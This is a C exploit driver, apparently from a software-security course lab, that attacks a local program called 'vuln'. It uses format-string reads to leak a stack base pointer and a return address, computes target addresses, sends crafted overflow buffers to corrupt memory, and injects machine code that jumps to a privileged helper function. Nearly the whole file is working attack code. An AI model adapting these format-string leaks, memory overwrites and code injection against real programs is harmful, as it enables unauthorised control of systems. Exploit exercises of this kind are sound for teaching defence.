#include <sys/wait.h>
#include "driver_base.h"
#include "constants.h"

int main() {
    char *nargv[3] = { "vuln", STRINGIFY(GRP), NULL };

    // Fork subprocess vuln
    create_subproc("./vuln", nargv);
    fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
            "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
            "to continue with the exploit\n");

    getchar();
    get_formatted("%*s"); // Needed to clear out the Welcome message

    put_str("e %218$p\n");
    send();
    uint64_t cur_main_bp;
    get_formatted("%p", &cur_main_bp);
    fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);

    // The probed offset is 219 for the return address for main_loop
    put_str("e %219$p\n");
    send();
    uint64_t curr_main_loop_return_addr;
    get_formatted("%p", &curr_main_loop_return_addr);
    fprintf(stderr, "driver: Extracted curr_main_loop_return_addr=%lx\n", curr_main_loop_return_addr);

    uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
    uint64_t cur_return_addr_loc = cur_main_bp + main_loop_return_addr_dist;
    uint64_t curr_auth_cred = cur_auth_bp - auth_bp_cred_dist;
    uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper_distance;

    fprintf(stderr, "driver: Computed\ncur_auth_bp=%lx\ncur_return_addr_loc=%lx\ncur_auth_cred=%lx\ncurr_private_helper_addr=%lx\n", 
            cur_auth_bp, cur_return_addr_loc, curr_auth_cred, curr_private_helper_addr);

    put_str("u 1234567\n");
    send();
    get_formatted("%*s");

    explsz = 528;
    *expl = (void**)malloc(explsz);
    // Initialize the buffer with '\1' to make the contents predictable.
    memset((void*)expl, '\1', explsz);
    expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
    expl[explsz/sizeof(void*)-3] = (void*) 0x00000000000001f0;
    expl[explsz/sizeof(void*)-2] = (void*) cur_return_addr_loc;
    expl[explsz/sizeof(void*)-1] = (void*) curr_auth_cred;

    put_str("p ");
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();
    get_formatted("%*s");

    put_str("p 1234567");
    send();
    get_formatted("%*s");

    explsz = auth_db_cred_dist - 8;
    *expl = (void**)malloc(explsz);
    memset((void*)expl, 0x90, explsz);

    uint64_t injected_code[64] = {
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
	    0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  // jmpq   *%rax
    };
    int injected_code_size = sizeof(injected_code) / sizeof(injected_code[0]);

    // Setting private helper addr in the injected code
    for (int i = 0; i < 8; i++) {
        uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
        injected_code[i+2] = byte;
    }

    // Adding the injected code to expl
    int curr_expl_location = 0;
    int shift_bytes = 0;
    for(int i = 0; i < injected_code_size; i++) {
        if(i % 8 == 0) {
            curr_expl_location++;
            expl[curr_expl_location] = 0x0000000000000000;
            shift_bytes = 0;
        }
        expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
        shift_bytes++;
    }

    put_str("u ");
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();
    get_formatted("%*s");

    explsz = 504;
    *expl = (void**)malloc(explsz);
    // Initialize the buffer with '\1' to make the contents predictable.
    memset((void*)expl, '\1', explsz);
    expl[explsz/sizeof(void*)-1] = (void*) 0x000003f000000001;

    put_str("p ");
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();
    get_formatted("%*s");

    put_str("p 1234567\n");
    send();
    get_formatted("%*s");

    put_str("l \n");
    send();
    usleep(100000);
    get_formatted("%*s");

    put_str("q \n");
    send();
    get_formatted("%*s");

    kill(pid, SIGINT);
    int status;
    wait(&status);
    display_vuln_status(status);

    return 0;
}
